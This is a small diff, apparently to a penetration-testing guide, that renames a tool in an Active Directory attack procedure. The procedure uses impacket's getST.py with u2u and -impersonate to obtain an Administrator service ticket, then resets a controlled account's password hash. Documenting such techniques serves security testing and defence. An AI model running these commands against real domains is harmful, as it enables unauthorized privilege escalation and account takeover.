@@ -211,7 +211,7 @@ changepasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN'
 KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN'
 
 # The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
-smbpasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
+changepasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
 ```
 
 
